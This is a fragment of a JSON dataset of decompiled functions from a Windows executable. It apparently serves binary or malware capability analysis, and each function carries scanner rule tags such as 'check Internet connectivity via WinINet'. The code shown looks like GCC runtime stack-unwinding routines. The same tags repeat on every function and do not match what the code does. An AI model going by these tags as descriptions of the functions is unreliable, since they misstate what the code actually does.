= uVar12 + 7;\n                                        param_2 = param_2 | (uVar11 & 0x7f) << uVar3;\n                                        puVar19 = puVar9;\n                                    } while (uVar11 < '\\0');\n                                    break;\n                                case 0xe:\n                                    param_2 = NULL;\n                                    uVar14 = 0;\n                                    puVar19 = puVar9;\n                                    do {\n                                        puVar9 = puVar19 + 1;\n                                        uVar12 = *puVar19;\n                                        uVar11 = uVar14;\n                                        uVar14 = uVar14 + 7;\n                                        param_2 = param_2 | (uVar12 & 0x7f) << (uVar11 & 0x1f);\n                                        puVar19 = puVar9;\n                                    } while (uVar12 < '\\0');\n                                    if ((uVar14 < 0x20) && ((uVar12 & 0x40) != 0)) {\n                                        param_2 = param_2 | -(1 << (uVar14 & 0x1f));\n                                    }\n                                    break;\n                                case 0xf:\n                                    if (ppiStack404 == NULL) goto code_r0x004014e0;\n                                    param_2 = *(&stack0xfffffe84 + ppiStack404 * 4);\n                                    break;\n                                case 0x10:\n                                    if (ppiStack404 != NULL) {\n                                        ppiStack404 = ppiStack404 + -1;\n                                        goto code_r0x0041a024;\n                                    }\n                                    goto code_r0x004014e0;\n                                case 0x11:\n                                    if (ppiStack404 < 2) goto code_r0x004014e0;\n                                    param_2 = *(&stack0xfffffe80 + ppiStack404 * 4);\n                                    break;\n                                case 0x12:\n                                    puVar9 = puVar19 + 2;\n                                    if (ppiStack404 + -1 <= puVar19[1]) goto code_r0x004014e0;\n                                    param_2 = *(&stack0xfffffe88 + ((ppiStack404 + -1) - puVar19[1]) * 4);\n                                    break;\n                                case 0x13:\n                                    if (1 < ppiStack404) {\n                                        uVar2 = *(&stack0xfffffe88 + (ppiStack404 + -1) * 4);\n                                        *(&stack0xfffffe88 + (ppiStack404 + -1) * 4) =\n                                             *(&stack0xfffffe88 + (ppiStack404 + -2) * 4);\n                                        *(&stack0xfffffe88 + (ppiStack404 + -2) * 4) = uVar2;\n                                        goto code_r0x0041a024;\n                                    }\n                                    goto code_r0x004014e0;\n                                case 0x14:\n                                    if (2 < ppiStack404) {\n                                        uVar2 = *(&stack0xfffffe88 + (ppiStack404 + -1) * 4);\n                                        ppiVar20 = *(&stack0xfffffe88 + (ppiStack404 + -2) * 4);\n                                        param_2 = *(&stack0xfffffe88 + (ppiStack404 + -3) * 4);\n                                        *(&stack0xfffffe88 + (ppiStack404 + -1) * 4) = ppiVar20;\n                                        *(&stack0xfffffe88 + (ppiStack404 + -2) * 4) = param_2;\n                                        *(&stack0xfffffe88 + (ppiStack404 + -3) * 4) = uVar2;\n                                        goto code_r0x0041a024;\n                                    }\n                                    goto code_r0x004014e0;\n                                case 0x17:\n                                case 0x18:\n                                case 0x19:\n                                case 0x1a:\n                                case 0x1b:\n                                case 0x1e:\n                                case 0x1f:\n                                case 0x21:\n                                case 0x22:\n                                case 0x23:\n                                case 0x24:\n                                case 0x26:\n                                case 0x27:\n                                case 0x28:\n                                case 0x29:\n                                case 0x2a:\n                                case 0x2b:\n                                    if (ppiStack404 < 2) goto code_r0x004014e0;\n                                    ppiVar20 = ppiStack404 + -2;\n                                    ppiVar8 = *(&stack0xfffffe84 + ppiStack404 * 4);\n                                    param_2 = *(&stack0xfffffe88 + ppiVar20 * 4);\n                                    uVar12 = ppiVar8;\n                                    ppiStack404 = ppiVar20;\n                                    switch(uVar14 - 0x1a & 0xff) {\n                                    case 0:\n                                        param_2 = param_2 & ppiVar8;\n                                        break;\n                                    case 1:\n                                        param_2 = param_2 / ppiVar8;\n                                        break;\n                                    case 2:\n                                        param_2 = param_2 - ppiVar8;\n                                        break;\n                                    case 3:\n                                        param_2 = param_2 % ppiVar8;\n                                        break;\n                                    case 4:\n                                        param_2 = param_2 * ppiVar8;\n                                        break;\n                                    default:\n                                        goto code_r0x0041a4a9;\n                                    case 7:\n                                        param_2 = param_2 | ppiVar8;\n                                        break;\n                                    case 8:\n                                        param_2 = param_2 + ppiVar8;\n                                        break;\n                                    case 10:\n                                        param_2 = param_2 << (uVar12 & 0x1f);\n                                        break;\n                                    case 0xb:\n                                        param_2 = param_2 >> (uVar12 & 0x1f);\n                                        break;\n                                    case 0xc:\n                                        param_2 = param_2 >> (uVar12 & 0x1f);\n                                        break;\n                                    case 0xd:\n                                        param_2 = param_2 ^ ppiVar8;\n                                        break;\n                                    case 0xf:\n                                        param_2 = param_2 == ppiVar8;\n                                        break;\n                                    case 0x10:\n                                        param_2 = ppiVar8 <= param_2;\n                                        break;\n                                    case 0x11:\n                                        param_2 = ppiVar8 < param_2;\n                                        break;\n                                    case 0x12:\n                                        param_2 = param_2 <= ppiVar8;\n                                        break;\n                                    case 0x13:\n                                        param_2 = param_2 < ppiVar8;\n                                        break;\n                                    case 0x14:\n                                        param_2 = param_2 != ppiVar8;\n                                    }\n                                    break;\n                                case 0x25:\n                                    if (ppiStack404 != NULL) {\n                                        param_2 = ppiStack404 + -1;\n                                        puVar9 = puVar19 + 3;\n                                        ppiStack404 = param_2;\n                                        if (*(&stack0xfffffe88 + param_2 * 4) != 0) {\n                                            puVar9 = puVar9 + *(puVar19 + 1);\n                                        }\n                                        goto code_r0x0041a024;\n                                    }\n                                    goto code_r0x004014e0;\n                                case 0x2c:\n                                    puVar9 = puVar19 + *(puVar19 + 1) + 3;\n                                    goto code_r0x0041a024;\n                                case 0x2d:\n                                case 0x2e:\n                                case 0x2f:\n                                case 0x30:\n                                case 0x31:\n                                case 0x32:\n                                case 0x33:\n                                case 0x34:\n                                case 0x35:\n                                case 0x36:\n                                case 0x37:\n                                case 0x38:\n                                case 0x39:\n                                case 0x3a:\n                                case 0x3b:\n                                case 0x3c:\n                                case 0x3d:\n                                case 0x3e:\n                                case 0x3f:\n                                case 0x40:\n                                case 0x41:\n                                case 0x42:\n                                case 0x43:\n                                case 0x44:\n                                case 0x45:\n                                case 0x46:\n                                case 0x47:\n                                case 0x48:\n                                case 0x49:\n                                case 0x4a:\n                                case 0x4b:\n                                case 0x4c:\n                                    param_2 = uVar14 - 0x30;\n                                    break;\n                                case 0x4d:\n                                case 0x4e:\n                                case 0x4f:\n                                case 0x50:\n                                case 0x51:\n                                case 0x52:\n                                case 0x53:\n                                case 0x54:\n                                case 0x55:\n                                case 0x56:\n                                case 0x57:\n                                case 0x58:\n                                case 0x59:\n                                case 0x5a:\n                                case 0x5b:\n                                case 0x5c:\n                                case 0x5d:\n                                case 0x5e:\n                                case 0x5f:\n                                case 0x60:\n                                case 0x61:\n                                case 0x62:\n                                case 99:\n                                case 100:\n                                case 0x65:\n                                case 0x66:\n                                case 0x67:\n                                case 0x68:\n                                case 0x69:\n                                case 0x6a:\n                                case 0x6b:\n                                case 0x6c:\n                                    iVar13 = uVar14 - 0x50;\n                                    if (0x11 < iVar13) goto code_r0x004014e0;\n                                    param_2 = *(extraout_ECX + iVar13 * 4);\n                                    if (((*(extraout_ECX + 99) & 0x40) == 0) ||\n                                       (*(extraout_ECX + 0x6c + iVar13) == '\\0')) {\n                                        if (*(uVar14 + 0x5493a4) != '\\x04') goto code_r0x004014e0;\ncode_r0x0041a16c:\n                                        param_2 = *param_2;\n                                    }\n                                    break;\n                                case 0x6d:\n                                case 0x6e:\n                                case 0x6f:\n                                case 0x70:\n                                case 0x71:\n                                case 0x72:\n                                case 0x73:\n                                case 0x74:\n                                case 0x75:\n                                case 0x76:\n                                case 0x77:\n                                case 0x78:\n                                case 0x79:\n                                case 0x7a:\n                                case 0x7b:\n                                case 0x7c:\n                                case 0x7d:\n                                case 0x7e:\n                                case 0x7f:\n                                case 0x80:\n                                case 0x81:\n                                case 0x82:\n                                case 0x83:\n                                case 0x84:\n                                case 0x85:\n                                case 0x86:\n                                case 0x87:\n                                case 0x88:\n                                case 0x89:\n                                case 0x8a:\n                                case 0x8b:\n                                case 0x8c:\n                                    uVar22 = 0;\n                                    uVar15 = 0;\n                                    puVar19 = puVar9;\n                                    do {\n                                        puVar9 = puVar19 + 1;\n                                        uVar12 = *puVar19;\n                                        uVar11 = uVar15;\n                                        uVar15 = uVar15 + 7;\n                                        uVar22 = uVar22 | (uVar12 & 0x7f) << (uVar11 & 0x1f);\n                                        puVar19 = puVar9;\n                                    } while (uVar12 < '\\0');\n                                    if ((uVar15 < 0x20) && ((uVar12 & 0x40) != 0)) {\n                                        uVar22 = uVar22 | -(1 << (uVar15 & 0x1f));\n                                    }\n                                    iVar13 = uVar14 - 0x70;\n                                    if (0x11 < iVar13) goto code_r0x004014e0;\n                                    puVar10 = *(extraout_ECX + iVar13 * 4);\n                                    if (((*(extraout_ECX + 99) & 0x40) == 0) ||\n                                       (*(extraout_ECX + 0x6c + iVar13) == '\\0')) {\n                                        if (*(uVar14 + 0x549384) != '\\x04') goto code_r0x004014e0;\n                                        puVar10 = *puVar10;\n                                    }\n                                    param_2 = puVar10 + uVar22;\n                                    break;\n                                case 0x8d:\n                                    uVar14 = 0;\n                                    uVar12 = 0;\n                                    puVar19 = puVar9;\n                                    do {\n                                        puVar9 = puVar19 + 1;\n                                        uVar11 = *puVar19;\n                                        uVar3 = uVar12 & 0x1f;\n                                        uVar12 = uVar12 + 7;\n                                        uVar14 = uVar14 | (uVar11 & 0x7f) << uVar3;\n                                        puVar19 = puVar9;\n                                    } while (uVar11 < '\\0');\n                                    if (0x11 < uVar14) goto code_r0x004014e0;\n                                    param_2 = *(extraout_ECX + uVar14 * 4);\n                                    if (((*(extraout_ECX + 99) & 0x40) == 0) ||\n                                       (*(extraout_ECX + 0x6c + uVar14) == '\\0')) {\n                                        if (*(uVar14 + 0x5493f4) == '\\x04') goto code_r0x0041a16c;\n                                        goto code_r0x004014e0;\n                                    }\n                                    break;\n                                case 0x8f:\n                                    uVar14 = 0;\n                                    uVar12 = 0;\n                                    do {\n                                        puVar19 = puVar9 + 1;\n                                        uVar11 = *puVar9;\n                                        uVar3 = uVar12 & 0x1f;\n                                        uVar12 = uVar12 + 7;\n                                        uVar14 = uVar14 | (uVar11 & 0x7f) << uVar3;\n                                        puVar9 = puVar19;\n                                    } while (uVar11 < '\\0');\n                                    uVar22 = 0;\n                                    uVar15 = 0;\n                                    do {\n                                        puVar9 = puVar19 + 1;\n                                        uVar12 = *puVar19;\n                                        uVar11 = uVar15;\n                                        uVar15 = uVar15 + 7;\n                                        uVar22 = uVar22 | (uVar12 & 0x7f) << (uVar11 & 0x1f);\n                                        puVar19 = puVar9;\n                                    } while (uVar12 < '\\0');\n                                    if ((uVar15 < 0x20) && ((uVar12 & 0x40) != 0)) {\n                                        uVar22 = uVar22 | -(1 << (uVar15 & 0x1f));\n                                    }\n                                    if (0x11 < uVar14) goto code_r0x004014e0;\n                                    puVar10 = *(extraout_ECX + uVar14 * 4);\n                                    if (((*(extraout_ECX + 99) & 0x40) == 0) ||\n                                       (*(extraout_ECX + 0x6c + uVar14) == '\\0')) {\n                                        if (*(uVar14 + 0x5493f4) != '\\x04') goto code_r0x004014e0;\n                                        puVar10 = *puVar10;\n                                    }\n                                    param_2 = uVar22 + puVar10;\n                                    break;\n                                case 0x93:\n                                    goto code_r0x0041a024;\n                                case 0xee:\n                                    fcn.004190f0();\n                                    puVar9 = fcn.00418fb0(&stack0xfffffe84);\n                                    param_2 = ppiStack380;\n                                }\ncode_r0x0041a010:\n                                if (0x3f < ppiStack404) goto code_r0x004014e0;\n                                *(&stack0xfffffe88 + ppiStack404 * 4) = param_2;\n                                ppiVar20 = ppiStack404;\n                                ppiStack404 = ppiStack404 + 1;\ncode_r0x0041a024:\n                                puVar19 = puVar9;\n                            } while (puVar9 < puVar16);\n                            if (ppiStack404 == NULL) {\ncode_r0x004014e0:\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                sub.msvcrt.dll_abort();\n                                iVar13 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n                                if (iVar13 == 0) {\n                                    *0x4ae004 = 0x41ca80;\n                                    pcVar6 = 0x41c830;\n                                }\n                                else {\n                                    *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                                    pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                                    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar13, \"__register_frame_info\");\n                                    *0x4ae004 = (*pcVar4)(iVar13, \"__deregister_frame_info\");\n                                }\n                                if (pcVar6 != NULL) {\n                                    (*pcVar6)(0x50c0f8, 0x54901c);\n                                }\n                                iVar13 = fcn.004014c0(fcn.00401590);\n                                return iVar13;\n                            }\n                            iStack88 = *(&stack0xfffffe84 + ppiStack404 * 4);\n                        }\n                        return iStack88;\n                    }\n                }\n                else if (uVar12 != 3) {\n                    if (uVar12 != 4) goto code_r0x00419fa8;\n                    iVar13 = 0x18;\n                    goto code_r0x00419c1e;\n                }\n                iVar13 = 0x10;\n            }\n        }\ncode_r0x00419c1e:\n        pcVar18 = iVar13 + iStack60;\n        if (*(param_2 + 0xba) != '\\0') {\n            do {\n                cVar5 = *pcVar18;\n                pcVar18 = pcVar18 + 1;\n            } while (cVar5 < '\\0');\n        }\n        if (*(param_2 + 0xb9) != -1) {\n            ppiStack96 = 0x419ca8;\n            fcn.004190f0();\n            ppiStack92 = &stack0xffffffe0;\n            ppiStack96 = 0x419cba;\n            fcn.00418fb0();\n            *(iStack64 + 0x50) = piStack32;\n        }\n        ppiStack96 = 0x419c81;\n        ppiStack92 = param_2;\n        fcn.00419130();\n        return 0;\n    }\n    pcVar18 = *(iStack64 + 0x4c);\n    piVar21 = *(iStack64 + 0x48);\n    if ((((pcVar18[-2] != -1) || (pcVar18[-1] != -0x30)) || (*pcVar18 != -0x7d)) || (pcVar18[1] != -8)) {\n        if (pcVar18[-5] != -0x18) {\n            if (((pcVar18[-5] != -0x75) || (pcVar18[-4] != 'M')) || (*pcVar18 != 'd')) {\ncode_r0x00419d06:\n                if (((((pcVar18[-1] == -0x7d) && (*pcVar18 == '\\t')) && (pcVar18[1] == '\\0')) &&\n                    ((pcVar18[2] == '-' && (pcVar18[3] == '\\0')))) && ((pcVar18[4] == '\\x10' && (pcVar18[5] == '\\0'))))\n                {\n                    param_2[0x28] = 0x1;\n                    param_2[0x26] = 0x4;\n                    param_2[0x25] = 0x4;\n                    param_2[3] = 0x1;\n                    param_2[2] = 0xfffffffc;\n                    param_2[0x2d] = 0x8;\n                    param_2[0x11] = 0x1;\n                    param_2[0x10] = NULL;\n                    *(param_2 + 0xbb) = 1;\n                    return 0;\n                }\n                return 5;\n            }\n            if (pcVar18[1] != -0x75) {\n                return 5;\n            }\n            iVar13 = piVar21[2];\n            goto code_r0x00419df0;\n        }\n        if ((pcVar18[-4] != 'h') || (*pcVar18 != -0x3d)) {\n            if (*pcVar18 != -0x7d) goto code_r0x00419d06;\n            if (pcVar18[1] != -0x3c) {\n                return 5;\n            }\n            if (pcVar18[3] != -0x48) {\n                return 5;\n            }\n            iVar13 = piVar21[0xe];\n            goto code_r0x00419df0;\n        }\n    }\n    iVar13 = *(*piVar21 + 4);\ncode_r0x00419df0:\n    iVar7 = *(iVar13 + 0xc4);\n    param_2[1] = 0x1;\n    param_2[0x28] = 0x1;\n    param_2[7] = 0x1;\n    param_2[0x26] = 0x4;\n    param_2[0x25] = iVar7 - piVar21;\n    *param_2 = (iVar13 + 0xb0) - iVar7;\n    param_2[3] = 0x1;\n    param_2[6] = (iVar13 + 0xa4) - iVar7;\n    param_2[5] = 0x1;\n    param_2[2] = (iVar13 + 0xac) - iVar7;\n    param_2[0xd] = 0x1;\n    param_2[4] = (iVar13 + 0xa8) - iVar7;\n    param_2[0xf] = 0x1;\n    param_2[0xc] = (iVar13 + 0xa0) - iVar7;\n    param_2[0xb] = 0x1;\n    param_2[0xe] = (iVar13 + 0x9c) - iVar7;\n    param_2[0x11] = 0x1;\n    param_2[0x10] = (iVar13 + 0xb8) - iVar7;\n    param_2[10] = (iVar13 + 0xb4) - iVar7;\n    param_2[0x2d] = 0x8;\n    *(param_2 + 0xbb) = 1;\n    return 0;\n}\n",
        "token_count": 8624
    },
    "0041a630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a630(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint *in_EAX;\n    char *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint extraout_ECX;\n    uint *puVar8;\n    ulong uVar9;\n    uint auStack428 [38];\n    uint uStack276;\n    uint uStack272;\n    uint uStack264;\n    uint uStack204;\n    int32_t iStack176;\n    uint uStack160;\n    uint auStack156 [4];\n    uint *puStack140;\n    uint32_t uStack60;\n    char acStack48 [4];\n    char cStack44;\n    \n    puVar7 = in_EAX;\n    puVar8 = auStack156;\n    for (iVar6 = 0x20; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    if ((((uStack60 & 0x40000000) == 0) || (cStack44 == '\\0')) && (puStack140 == NULL)) {\n        if (*0x5493f8 == '\\x04') {\n            if ((uStack60 & 0x40000000) != 0) {\n                cStack44 = '\\0';\n            }\n            puStack140 = &uStack160;\n            uStack160 = in_EAX[0x12];\n            goto code_r0x0041a672;\n        }\n    }\n    else {\ncode_r0x0041a672:\n        if ((*(in_EAX + 99) & 0x40) != 0) {\n            *(in_EAX + 0x1c) = 0;\n        }\n        in_EAX[4] = 0;\n        if (*(param_2 + 0xa0) != 1) {\n            if (*(param_2 + 0xa0) == 2) {\n                pcVar4 = *(param_2 + 0x9c);\n                do {\n                    cVar1 = *pcVar4;\n                    pcVar4 = pcVar4 + 1;\n                } while (cVar1 < '\\0');\n                iStack176 = fcn.00419fb0();\n                goto code_r0x0041a721;\n            }\n            uVar9 = sub.msvcrt.dll_abort();\n            auStack428[0] = uVar9 >> 0x20;\n            puVar8 = uVar9;\n            puVar7 = puVar8;\n            for (iVar6 = 0x20; iVar6 != 0; iVar6 = iVar6 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            puVar8[0x18] = 0x40000000;\n            puVar8[0x13] = uStack204;\n            iVar6 = fcn.00419990();\n            pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n            if (iVar6 == 0) {\n                if (*0x4f59f4 == 0) {\n                    if (*0x5493f4 == '\\0') {\n                        *0x5493f4 = '\\x04';\n                        *0x5493f6 = 4;\n                        *0x5493f5 = 4;\n                        *0x5493f7 = 4;\n                        *0x5493fa = 4;\n                        *0x5493fb = 4;\n                        *0x5493f9 = 4;\n                        *0x5493f8 = '\\x04';\n                        *0x5493ff = 0xc;\n                        *0x549400 = 0xc;\n                        *0x549401 = 0xc;\n                        *0x549402 = 0xc;\n                        *0x549403 = 0xc;\n                        *0x549404 = 0xc;\n                        *0x5493fd = 4;\n                        *0x5493fc = 4;\n                    }\n                }\n                else if (*0x4f59f8 == 0) {\n                    LOCK();\n                    *0x4f59fc = *0x4f59fc + 1;\n                    if (*0x4f59fc == 0) {\n                        *0x5493f4 = '\\x04';\n                        *0x5493f6 = 4;\n                        *0x5493f5 = 4;\n                        *0x5493f7 = 4;\n                        *0x5493fa = 4;\n                        *0x5493fb = 4;\n                        *0x5493f9 = 4;\n                        *0x5493f8 = '\\x04';\n                        *0x5493ff = 0xc;\n                        *0x549400 = 0xc;\n                        *0x549401 = 0xc;\n                        *0x549402 = 0xc;\n                        *0x549403 = 0xc;\n                        *0x549404 = 0xc;\n                        *0x5493fd = 4;\n                        *0x5493fc = 4;\n                        *0x4f59f8 = 1;\n                    }\n                    else {\n                        do {\n                            (*pcVar3)(0);\n                        } while (*0x4f59f8 == 0);\n                    }\n                }\n                if (*0x5493f8 == '\\x04') {\n                    if ((*(puVar8 + 99) & 0x40) != 0) {\n                        *(puVar8 + 0x1c) = 0;\n                    }\n                    uStack264 = 1;\n                    puVar8[4] = auStack428;\n                    uStack272 = 4;\n                    uStack276 = 0;\n                    fcn.0041a630();\n                    puVar8[0x13] = extraout_ECX;\n                    return;\n                }\n            }\n            goto code_r0x004014e0;\n        }\n        iVar6 = *(param_2 + 0x98);\n        if (iVar6 < 0x12) {\n            puVar7 = auStack156[iVar6];\n            if (((uStack60 & 0x40000000) == 0) || (acStack48[iVar6] == '\\0')) {\n                if (*(iVar6 + 0x5493f4) != '\\x04') goto code_r0x004a69bb;\n                puVar7 = *puVar7;\n            }\n            iStack176 = puVar7 + *(param_2 + 0x94);\ncode_r0x0041a721:\n            iVar6 = 0;\n            in_EAX[0x12] = iStack176;\n            do {\n                if (*(param_2 + 4 + iVar6 * 8) < 6) {\n    // WARNING: Could not recover jumptable at 0x0041a73b. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (6 cases) at 0x505a80\n                    (**(*(param_2 + 4 + iVar6 * 8) * 4 + 0x505a80))();\n                    return;\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 != 0x12);\n            uVar5 = in_EAX[0x18] & 0x7fffffff;\n            if (*(param_2 + 0xbb) != '\\0') {\n                uVar5 = in_EAX[0x18] | 0x80000000;\n            }\n            in_EAX[0x18] = uVar5;\n            return;\n        }\n    }\ncode_r0x004a69bb:\n    sub.msvcrt.dll_abort();\ncode_r0x004014e0:\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar6 == 0) {\n        *0x4ae004 = 0x41ca80;\n        pcVar3 = 0x41c830;\n    }\n    else {\n        *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar6, \"__register_frame_info\");\n        *0x4ae004 = (*pcVar2)(iVar6, \"__deregister_frame_info\");\n    }\n    if (pcVar3 != NULL) {\n        (*pcVar3)(0x50c0f8, 0x54901c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 2065
    },
    "0041ad70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ad70(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t in_EAX;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint auStack32 [4];\n    \n    if ((((*(param_2 + 0x60) & 0x40000000) == 0) || (*(param_2 + 0x70) == '\\0')) && (*(param_2 + 0x10) == 0)) {\n        if (*0x5493f8 != '\\x04') goto code_r0x004014e0;\n        if ((*(param_2 + 0x60) & 0x40000000) != 0) {\n            *(param_2 + 0x70) = 0;\n        }\n        *(param_2 + 0x10) = auStack32;\n        auStack32[0] = *(param_2 + 0x48);\n    }\n    iVar7 = 0;\n    do {\n        while( true ) {\n            puVar5 = *(in_EAX + iVar7 * 4);\n            puVar8 = *(param_2 + iVar7 * 4);\n            if (*(in_EAX + 0x6c + iVar7) != '\\0') goto code_r0x004014e0;\n            if (*(param_2 + 0x6c + iVar7) == '\\0') break;\n            if (puVar5 != NULL) {\n                if (*(iVar7 + 0x5493f4) != '\\x04') goto code_r0x004014e0;\n                *puVar5 = puVar8;\n            }\ncode_r0x0041adb3:\n            iVar7 = iVar7 + 1;\n            if (iVar7 == 0x11) goto code_r0x0041ae50;\n        }\n        if ((puVar5 == NULL || puVar8 == NULL) || (puVar5 == puVar8)) goto code_r0x0041adb3;\n        uVar1 = *(iVar7 + 0x5493f4);\n        uVar4 = uVar1;\n        if (uVar4 < 4) {\n            if ((uVar4 != 0) && (*puVar5 = *puVar8,  (uVar1 & 2) != 0)) {\n                *(puVar5 + (uVar4 - 2)) = *(puVar8 + (uVar4 - 2));\n            }\n            goto code_r0x0041adb3;\n        }\n        iVar7 = iVar7 + 1;\n        *puVar5 = *puVar8;\n        *(puVar5 + (uVar4 - 4)) = *(puVar8 + (uVar4 - 4));\n        iVar6 = puVar5 - (puVar5 + 1 & 0xfffffffc);\n        puVar8 = puVar8 - iVar6;\n        puVar5 = puVar5 + 1 & 0xfffffffc;\n        for (uVar4 = iVar6 + uVar4 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar5 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    } while (iVar7 != 0x11);\ncode_r0x0041ae50:\n    iVar7 = 0;\n    if (((*(in_EAX + 99) & 0x40) != 0) && (*(in_EAX + 0x70) != '\\0')) {\n        return iVar7;\n    }\n    if (*(in_EAX + 0x10) == 0) {\n        puVar5 = *(param_2 + 0x10);\n        if (((*(param_2 + 99) & 0x40) == 0) || (*(param_2 + 0x70) == '\\0')) {\n            if (*0x5493f8 != '\\x04') {\ncode_r0x004014e0:\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                sub.msvcrt.dll_abort();\n                iVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n                if (iVar7 == 0) {\n                    *0x4ae004 = 0x41ca80;\n                    pcVar3 = 0x41c830;\n                }\n                else {\n                    *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar7, \"__register_frame_info\");\n                    *0x4ae004 = (*pcVar2)(iVar7, \"__deregister_frame_info\");\n                }\n                if (pcVar3 != NULL) {\n                    (*pcVar3)(0x50c0f8, 0x54901c);\n                }\n                iVar7 = fcn.004014c0(fcn.00401590);\n                return iVar7;\n            }\n            puVar5 = *puVar5;\n        }\n        iVar7 = puVar5 + (*(param_2 + 0x68) - *(in_EAX + 0x48));\n    }\n    return iVar7;\n}\n",
        "token_count": 1280
    },
    "0041b950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar fcn.0041b950(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uchar auStack16 [8];\n    \n    iVar1 = sub.msvcrt.dll_strlen(in_EAX + 9);\n    pcVar2 = in_EAX + 10 + iVar1;\n    if (3 < *(in_EAX + 8)) {\n        if (*pcVar2 != '\\x04') {\n            return -1;\n        }\n        if (pcVar2[1] != '\\0') {\n            return -1;\n        }\n        pcVar2 = pcVar2 + 2;\n    }\n    if (*(in_EAX + 9) != 'z') {\n        return '\\0';\n    }\n    do {\n        pcVar5 = pcVar2 + 1;\n        if (-1 < *pcVar2) break;\n        pcVar3 = pcVar2 + 1;\n        pcVar5 = pcVar2 + 2;\n        pcVar2 = pcVar2 + 2;\n    } while (*pcVar3 < '\\0');\n    do {\n        pcVar2 = pcVar5;\n        pcVar5 = pcVar2 + 1;\n    } while (*pcVar2 < '\\0');\n    if (*(in_EAX + 8) == 1) {\n        pcVar2 = pcVar2 + 2;\n    }\n    else {\n        do {\n            pcVar2 = pcVar5 + 1;\n            cVar4 = *pcVar5;\n            pcVar5 = pcVar2;\n        } while (cVar4 < '\\0');\n    }\n    pcVar5 = in_EAX + 10;\n    do {\n        pcVar3 = pcVar2 + 1;\n        cVar4 = *pcVar2;\n        pcVar2 = pcVar3;\n    } while (cVar4 < '\\0');\n    cVar4 = *(in_EAX + 10);\n    while (cVar4 != 'R') {\n        while (cVar4 != 'P') {\n            if (cVar4 != 'L') {\n                return '\\0';\n            }\n            pcVar5 = pcVar5 + 1;\n            cVar4 = *pcVar5;\n            pcVar3 = pcVar3 + 1;\n            if (cVar4 == 'R') goto code_r0x0041ba06;\n        }\n        pcVar5 = pcVar5 + 1;\n        pcVar3 = fcn.0041b7a0(auStack16);\n        cVar4 = *pcVar5;\n    }\ncode_r0x0041ba06:\n    return *pcVar3;\n}\n",
        "token_count": 599
